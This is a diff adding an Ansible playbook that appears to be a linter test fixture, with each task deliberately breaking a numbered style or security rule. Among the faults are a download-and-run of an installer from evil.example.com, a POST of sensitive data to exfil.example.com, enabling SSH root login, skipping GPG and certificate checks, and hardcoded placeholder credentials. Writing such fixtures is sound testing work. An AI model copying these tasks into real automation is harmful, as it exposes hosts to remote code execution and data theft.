@@ -1,0 +1,330 @@
+---
+# L003: play without name
+- hosts: all
+  # M010: Python 2 interpreter
+  vars:
+    ansible_python_interpreter: /usr/bin/python2.7
+    # L050: non-lowercase variable names
+    MyAppVersion: "2.1"
+    Server_Port: 8080
+    # SEC: hardcoded credentials in playbook vars
+    api_key: "sk-proj-not-real-but-looks-like-a-key-1234567890"
+    db_password: "SuperSecret123!"
+    aws_secret: "not-a-real-aws-secret-key-example-1234"
+  # L018: become_user without become
+  become_user: deployer
+  tasks:
+    # L024/L028: task without name
+    - shell: echo "hello world"
+
+    # L007/L029: shell instead of command (no shell features)
+    # L013: no changed_when
+    # L046: free-form command
+    - name: get the hostname
+      shell: hostname
+
+    # L006: command where a module exists
+    # L013: no changed_when
+    - name: read the hosts file
+      command: cat /etc/hosts
+
+    # L002/L026/L030: short module name, not FQCN, not builtin
+    # L021: no mode on copy
+    # L017: relative path in src
+    - name: copy a config file
+      copy:
+        src: files/app.conf
+        dest: /etc/app/app.conf
+
+    # L020: numeric mode (not string)
+    - name: set permissions on the app directory
+      file:
+        path: /opt/app
+        state: directory
+        mode: 755
+
+    # L012: state latest
+    - name: install packages
+      yum:
+        name: httpd
+        state: latest
+
+    # L010: ignore_errors
+    # M006: become + ignore_errors without ignore_unreachable
+    - name: restart the broken service
+      become: true
+      shell: systemctl restart broken-service
+      ignore_errors: true
+
+    # L015: jinja in when
+    # L051: bad jinja spacing
+    - name: conditionally do something
+      command: echo "conditional"
+      when: "{{MyAppVersion}} == '2.1'"
+
+    # L009: comparison to empty string
+    - name: check if variable is set
+      debug:
+        msg: "Variable is empty"
+      when: db_password == ""
+
+    # L011: literal true/false comparison
+    - name: check boolean
+      debug:
+        msg: "It is true"
+      when: some_flag == true
+
+    # L008: local_action instead of delegate_to
+    - name: run something locally
+      local_action: command echo "local"
+
+    # L016: pause without timeout
+    - name: wait for user input
+      pause:
+        prompt: "Press enter to continue"
+
+    # L014: when result.changed instead of handler
+    - name: deploy the application
+      copy:
+        src: files/app.tar.gz
+        dest: /opt/app/app.tar.gz
+      register: deploy_result
+
+    - name: restart after deploy
+      command: systemctl restart app
+      when: deploy_result.changed
+
+    # L022: shell pipe without pipefail
+    - name: find large files
+      shell: find /var/log -type f | xargs ls -la | head -20
+      register: large_files
+
+    # M009: with_items instead of loop
+    # L025: lowercase task name
+    - name: install several packages
+      yum:
+        name: "{{ item }}"
+        state: present
+      with_items:
+        - wget
+        - curl
+        - vim
+        - git
+
+    # R101: parameterized command
+    - name: Run user-provided script
+      command: "bash {{ user_script }}"
+
+    # R108: privilege escalation
+    # L047: password without no_log
+    - name: Create the deploy user
+      user:
+        name: deployer
+        password: "{{ db_password }}"
+        state: present
+      become: true
+
+    # L048: copy with remote_src, no owner
+    - name: Copy binary from remote source
+      copy:
+        src: /tmp/app-binary
+        dest: /usr/local/bin/app
+        remote_src: true
+
+    # L044: implicit state
+    - name: Ensure the app user exists
+      user:
+        name: appuser
+
+    # L045: inline environment
+    - name: Run app with custom environment
+      command: /opt/app/bin/start
+      environment:
+        APP_HOME: /opt/app
+        APP_PORT: "{{ Server_Port }}"
+
+    # M009: with_dict (deprecated loop syntax)
+    - name: Create users from dict
+      user:
+        name: "{{ item.key }}"
+        comment: "{{ item.value }}"
+      with_dict: "{{ user_accounts }}"
+
+    # L049: loop var without prefix
+    - name: Process config files
+      template:
+        src: "{{ item.src }}"
+        dest: "{{ item.dest }}"
+      loop:
+        - src: templates/app.conf.j2
+          dest: /etc/app/app.conf
+        - src: templates/db.conf.j2
+          dest: /etc/app/db.conf
+      loop_control:
+        loop_var: item
+
+    # R111: parameterized role import
+    - name: Include role dynamically
+      include_role:
+        name: "{{ dynamic_role }}"
+
+    # R112: parameterized taskfile import
+    - name: Include tasks dynamically
+      include_tasks: "tasks/{{ task_file }}.yml"
+
+    # R113: parameterized package install
+    - name: Install user requested packages
+      yum:
+        name: "{{ user_packages }}"
+        state: present
+      become: true
+
+    # R118: download from external source
+    - name: Download installer from the internet
+      get_url:
+        url: "https://evil.example.com/installer.sh"
+        dest: /tmp/installer.sh
+
+    # R103: download and execute
+    - name: Run the downloaded installer
+      command: bash /tmp/installer.sh
+
+    # R115: file deletion
+    - name: Clean up temp files
+      file:
+        path: /tmp/installer.sh
+        state: absent
+
+    # L043: deprecated bare vars
+    - name: Use bare variable
+      debug:
+        msg: "Port is $Server_Port"
+
+    # community.general with argspec violations (P002/P003)
+    - name: Manage INI file with wrong args
+      community.general.ini_file:
+        dest: /etc/app/settings.ini
+        section: app
+        option: port
+        value: 8080
+        invalid_param: true
+        mode: 644
+
+    # L057 (wrong-module) moved to playbook-l057-wrong-module.yml so this file passes syntax-check.
+    # Valid sysctl usage (ansible.posix) so later tasks get full Ansible/argspec validation:
+    - name: Manage a sysctl value
+      ansible.posix.sysctl:
+        name: net.ipv4.ip_forward
+        value: "1"
+        state: present
+
+    # community.general with wrong types
+    - name: Create a cron job badly
+      community.general.cronvar:
+        name: APP_HOME
+        value: /opt/app
+        invalid_option: true
+
+    # L042: high task count block
+    - name: Block with too many tasks
+      block:
+        - debug: msg="task 1"
+        - debug: msg="task 2"
+        - debug: msg="task 3"
+        - debug: msg="task 4"
+        - debug: msg="task 5"
+        - debug: msg="task 6"
+        - debug: msg="task 7"
+        - debug: msg="task 8"
+        - debug: msg="task 9"
+        - debug: msg="task 10"
+        - debug: msg="task 11"
+        - debug: msg="task 12"
+        - debug: msg="task 13"
+        - debug: msg="task 14"
+        - debug: msg="task 15"
+        - debug: msg="task 16"
+        - debug: msg="task 17"
+        - debug: msg="task 18"
+        - debug: msg="task 19"
+        - debug: msg="task 20"
+
+    # R107: insecure package install option
+    - name: Install package without GPG check
+      yum:
+        name: sketchy-package
+        state: present
+        disable_gpg_check: true
+
+    # L033: unconditional override
+    - name: Override a variable unconditionally
+      set_fact:
+        Server_Port: 9090
+
+    # M009: with_dict
+    - name: Create users from dict
+      user:
+        name: "{{ item.key }}"
+        comment: "{{ item.value.comment }}"
+      with_dict: "{{ user_accounts }}"
+
+    # cisco.ios usage for M011 (network module needing upgrade)
+    - name: Configure IOS banner
+      cisco.ios.ios_banner:
+        banner: motd
+        text: "Unauthorized access prohibited"
+        state: present
+      delegate_to: localhost
+
+# Second play: also no name (L003 again). L040 (tabs) is in playbook-l040-tabs.yml.
+- hosts: dbservers
+  tasks:
+    - name: Configure database
+      command: mysql -e "CREATE DATABASE app"
+
+    # R109: key/config change
+    - name: Modify SSH config
+      lineinfile:
+        path: /etc/ssh/sshd_config
+        regexp: "^PermitRootLogin"
+        line: "PermitRootLogin yes"
+      become: true
+
+    # R114: file change
+    - name: Overwrite system config
+      template:
+        src: templates/sysctl.conf.j2
+        dest: /etc/sysctl.conf
+      become: true
+
+    # R104: download from unauthorized source
+    - name: Download from sketchy mirror
+      get_url:
+        url: "http://mirrors.sketchy.example.com/packages/db-tools.rpm"
+        dest: /tmp/db-tools.rpm
+        validate_certs: false
+
+    # R105: outbound transfer
+    - name: Upload data externally
+      uri:
+        url: "https://exfil.example.com/upload"
+        method: POST
+        body: "{{ sensitive_data }}"
+        body_format: json
+
+    # L036: include_vars without when/tags
+    - name: Load extra vars
+      include_vars:
+        file: vars/extras.yml
+
+    # R106: inbound transfer
+    - name: Fetch remote archive
+      unarchive:
+        src: "https://releases.example.com/app-v2.tar.gz"
+        dest: /opt/app
+        remote_src: true
+
+    # L027: role without metadata
+    - name: Use the broken role
+      include_role:
+        name: broken_role
